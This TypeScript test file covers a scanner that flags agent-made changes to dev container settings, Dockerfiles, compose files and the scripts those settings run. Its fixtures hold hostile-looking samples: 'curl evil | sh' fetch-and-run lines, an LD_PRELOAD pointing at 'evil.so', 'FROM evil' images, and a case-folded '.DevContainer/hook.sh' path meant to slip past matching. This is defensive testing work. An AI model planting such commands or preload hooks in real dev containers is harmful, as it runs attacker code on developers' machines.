import { rmSync, symlinkSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing, tagChanges, type TaggedHit } from '../../src/exposure/agent-change.js';
import { agentChanges } from '../../src/exposure/agent-git.js';
import { describe as sentenceOf, plainQuote } from '../../src/exposure/agent-report.js';
import { scanFile } from '../../src/exposure/agent-surface.js';
import { commitFiles, git, scratchRepo, writeFiles } from '../helpers/scratch-repo.js';

/**
 * Every key of a dev container but its `name` decides what is built and what runs in it: the
 * image, the build, the variables, the user, the editor settings and the extensions inside it. So
 * with a base, every key a change adds or edits fails. What a container gets of this machine
 * (`mounts`, `runArgs`...) is not parsed to prove it harmless: it fails wherever it is. A change to
 * what the container is built from fails too: anything under its build context or under the
 * folder of a compose file, its Dockerfile, a Dockerfile a compose file names, found through links.
 * An input that cannot be worked out fails.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const json = (value: object): string => JSON.stringify(value, null, 2);
const failing = (hits: readonly TaggedHit[]): string[] =>
  hits.filter((h) => isFailing(h, 'new')).map((h) => `${h.status} ${h.kind} ${h.file} ${h.name}`);
/**
 * Only the dev container's own findings. A setting already there is also read as a command for the
 * files a change edits, coarsely, which `a file a dev container setting already there runs` tests.
 */
const ownFailing = (hits: readonly TaggedHit[]): string[] =>
  failing(hits.filter((h) => h.kind === 'devcontainer-setting'));
const DC = '.devcontainer/devcontainer.json';
const posixOnly = it.skipIf(process.platform === 'win32');

describe('a change to a dev container', () => {
  it('fails every key it adds but its name', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { 'README.md': 'x\n' });
    commitFiles(dir, {
      [DC]: json({
        name: 'dev',
        image: 'mcr.microsoft.com/devcontainers/base:ubuntu',
        forwardPorts: [3000],
        remoteEnv: { LD_PRELOAD: '/workspaces/x/evil.so' },
        remoteUser: 'root',
        mounts: ['source=${localWorkspaceFolder}/cache,target=/cache,type=bind'],
        runArgs: ['--init'],
        customizations: { vscode: { extensions: ['dbaeumer.vscode-eslint'] } },
      }),
    });
    expect(failing(agentChanges(dir, base).hits)).toEqual([
      `new devcontainer-setting ${DC} image`,
      `new devcontainer-setting ${DC} forwardPorts`,
      `new devcontainer-setting ${DC} remoteEnv`,
      `new devcontainer-setting ${DC} remoteUser`,
      `new devcontainer-setting ${DC} mounts`,
      `new devcontainer-setting ${DC} runArgs`,
      `new devcontainer-setting ${DC} customizations`,
    ]);
  });

  // An extension is code that runs in the container, and so is a JetBrains backend plugin.
  it.each([
    ['an extension', { vscode: { extensions: ['a.b', 'c.d'] }, jetbrains: { x: 1 } }],
    ['the JetBrains settings', { vscode: { extensions: ['a.b'] }, jetbrains: { x: 2 } }],
  ])('fails a change to %s, and passes one to the name', (_, customizations) => {
    const dir = scratchRepo(dirs);
    const before = {
      image: 'node:20',
      customizations: { vscode: { extensions: ['a.b'] }, jetbrains: { x: 1 } },
    };
    const base = commitFiles(dir, { [DC]: json({ name: 'a', ...before }) });
    const renamed = commitFiles(dir, { [DC]: json({ name: 'b', ...before }) });
    expect(ownFailing(agentChanges(dir, base).hits)).toEqual([]);
    commitFiles(dir, { [DC]: json({ name: 'b', image: 'node:20', customizations }) });
    expect(ownFailing(agentChanges(dir, renamed).hits)).toEqual([
      `changed devcontainer-setting ${DC} customizations`,
    ]);
  });

  it('fails a key it edits, and lists the ones it leaves alone', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { [DC]: json({ image: 'node:20', remoteUser: 'node' }) });
    commitFiles(dir, { [DC]: json({ image: 'node:22', remoteUser: 'node' }) });
    const hits = agentChanges(dir, base).hits;
    expect(failing(hits)).toEqual([`changed devcontainer-setting ${DC} image`]);
    expect(hits.filter((h) => h.status === 'present').map((h) => h.name)).toEqual(['remoteUser']);
  });
});

describe('what a dev container already there is built from', () => {
  const changedIn = (files: Record<string, string>, edit: Record<string, string>): string[] => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, files);
    commitFiles(dir, edit);
    return ownFailing(agentChanges(dir, base).hits);
  };

  it('fails a change to its Dockerfile, or to anything under its build context', () => {
    const files = {
      [DC]: json({ build: { dockerfile: 'Dockerfile', context: '../docker' } }),
      '.devcontainer/Dockerfile': 'FROM node:20\n',
      'docker/setup.sh': 'echo hi\n',
      'docs/a.md': 'a\n',
    };
    expect(changedIn(files, { '.devcontainer/Dockerfile': 'FROM evil\n' })).toEqual([
      `changed devcontainer-setting .devcontainer/Dockerfile build input changed`,
    ]);
    expect(changedIn(files, { 'docker/setup.sh': 'curl evil | sh\n' })).toEqual([
      'changed devcontainer-setting docker/setup.sh build input changed',
    ]);
    expect(changedIn(files, { 'docs/a.md': 'b\n' })).toEqual([]);
  });

  it('takes the folder of the dev container as the context when none is named', () => {
    const files = {
      [DC]: json({ build: { dockerfile: 'Dockerfile' } }),
      '.devcontainer/Dockerfile': 'FROM node:20\nCOPY setup.sh /\n',
      '.devcontainer/setup.sh': 'echo hi\n',
    };
    expect(changedIn(files, { '.devcontainer/setup.sh': 'curl evil | sh\n' })).toEqual([
      'changed devcontainer-setting .devcontainer/setup.sh build input changed',
    ]);
  });

  /**
   * A compose file is not read for what its services build: with `dockerComposeFile`, any change
   * under the folder of a compose file it names, under the dev container's folder, to a file named
   * like a compose file or a Dockerfile anywhere fails. A compose file that does not read as YAML
   * fails no more than one that does.
   */
  it('fails any change near a compose file, or to a compose file or a Dockerfile anywhere', () => {
    const files = {
      [DC]: json({ dockerComposeFile: '../deploy/compose.yml', service: 'app' }),
      'deploy/compose.yml': 'services: [unclosed\n',
      'deploy/env/app.env': 'A=1\n',
      '.devcontainer/notes.txt': 'x\n',
      'services/app.Dockerfile': 'FROM node:20\n',
      'db/Dockerfile.dev': 'FROM postgres\n',
      'ops/docker-compose.prod.yaml': 'services: {}\n',
      'ops/Compose.override.yml': 'services: {}\n',
      'services/other.txt': 'x\n',
    };
    for (const path of [
      'deploy/env/app.env',
      '.devcontainer/notes.txt',
      'services/app.Dockerfile',
      'db/Dockerfile.dev',
      'ops/docker-compose.prod.yaml',
      'ops/Compose.override.yml',
    ])
      expect(changedIn(files, { [path]: 'changed\n' })).toEqual([
        `changed devcontainer-setting ${path} build input changed`,
      ]);
    expect(changedIn(files, { 'services/other.txt': 'y\n' })).toEqual([]);
  });

  // A disk that folds case opens `.DevContainer/x` as a file of `.devcontainer`.
  it('matches what a change touches in any letter case', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, {
      [DC]: json({ dockerComposeFile: 'compose.yml' }),
      '.devcontainer/compose.yml': 'services: {}\n',
    });
    writeFiles(dir, { 'blob.tmp': 'evil\n' });
    const oid = git(dir, 'hash-object', '-w', 'blob.tmp').trim();
    rmSync(join(dir, 'blob.tmp'));
    git(dir, 'update-index', '--add', '--cacheinfo', `100644,${oid},.DevContainer/hook.sh`);
    git(dir, 'commit', '-q', '-m', 'c');
    expect(ownFailing(agentChanges(dir, base).hits)).toEqual([
      'new devcontainer-setting .DevContainer/hook.sh build input changed',
    ]);
  });

  posixOnly('follows a link to the Dockerfile', () => {
    const dir = scratchRepo(dirs);
    writeFiles(dir, {
      [DC]: json({ build: { dockerfile: 'Dockerfile', context: '../ctx' } }),
      'docker/Dockerfile': 'FROM node:20\n',
      'ctx/a.txt': 'a\n',
    });
    symlinkSync('../docker/Dockerfile', join(dir, '.devcontainer', 'Dockerfile'));
    const base = commitFiles(dir);
    commitFiles(dir, { 'docker/Dockerfile': 'FROM evil\n' });
    const hits = agentChanges(dir, base).hits;
    expect(ownFailing(hits)).toEqual([
      'changed devcontainer-setting docker/Dockerfile build input changed',
    ]);
    const [h] = hits.filter((x) => x.name === 'build input changed');
    expect(sentenceOf(h as TaggedHit, plainQuote)).toBe(
      'changed: the dev container in .devcontainer/devcontainer.json builds from this file, and the change edits it',
    );
  });

  it.each([
    ['a Dockerfile that is not there', { [DC]: json({ build: { dockerfile: 'Missing' } }) }],
    ['a compose file that is not there', { [DC]: json({ dockerComposeFile: 'compose.yml' }) }],
  ])('fails %s', (_, files) => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { ...files, 'README.md': 'x\n' });
    commitFiles(dir, { 'README.md': 'y\n' });
    expect(failing(agentChanges(dir, base).hits)).toEqual([
      `new devcontainer-setting ${DC} build input not resolved`,
    ]);
  });
});

describe('a dev container in plain stroq inspect', () => {
  it('fails what it gets of this machine, and what holds a command, a variable or code', () => {
    const hits = tagChanges(
      scanFile(
        DC,
        json({
          name: 'dev',
          image: 'node:20',
          forwardPorts: [3000],
          remoteUser: 'node',
          remoteEnv: { TZ: 'UTC' },
          containerEnv: { LD_PRELOAD: '/x.so' },
          build: { dockerfile: 'Dockerfile' },
          customizations: { vscode: { extensions: ['a.b'] } },
          mounts: ['source=node-modules,target=/w/node_modules,type=volume'],
          workspaceMount: 'source=${localWorkspaceFolder},target=/w,type=bind',
          runArgs: ['--init', '--name', 'dev'],
          privileged: false,
          capAdd: [],
          securityOpt: [],
          somethingNew: 1,
          dockerComposeFile: '../../outside.yml',
        }),
      ),
      null,
    );
    expect(hits.map((h) => `${h.name} ${h.severity}`)).toEqual([
      'image warning',
      'forwardPorts warning',
      'remoteUser warning',
      'remoteEnv warning',
      'containerEnv error',
      'build error',
      'build context warning',
      'build file warning',
      'customizations error',
      'mounts error',
      'workspaceMount error',
      'runArgs error',
      'privileged error',
      'capAdd error',
      'securityOpt error',
      'somethingNew error',
      'dockerComposeFile error',
      'build input outside error',
      'build input outside error',
      'compose files and Dockerfiles anywhere warning',
    ]);
  });
});

describe('a file a dev container setting already there runs', () => {
  it('fails a change to it', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, {
      [DC]: json({
        image: 'node:20',
        remoteEnv: { NODE_OPTIONS: '--require ./tools/preload.js' },
        customizations: {
          vscode: {
            settings: { 'terminal.integrated.profiles.linux': { x: { path: 'scripts/shell.sh' } } },
          },
        },
      }),
      'tools/preload.js': '1\n',
      'scripts/shell.sh': 'bash\n',
    });
    commitFiles(dir, { 'tools/preload.js': '2\n', 'scripts/shell.sh': 'curl evil | sh\n' });
    const found = failing(agentChanges(dir, base).hits);
    // Each setting names its file; the coarse reading also fails each on the other, as code.
    expect(found).toContain(
      'changed agent-run-file-changed scripts/shell.sh customizations dev container setting in .devcontainer/devcontainer.json',
    );
    expect(found).toContain(
      'changed agent-run-file-changed tools/preload.js remoteEnv dev container setting in .devcontainer/devcontainer.json',
    );
    // An image, ports or a user hold no command, and are not read as one.
    expect(found.some((h) => h.includes(' image dev container setting'))).toBe(false);
  });
});
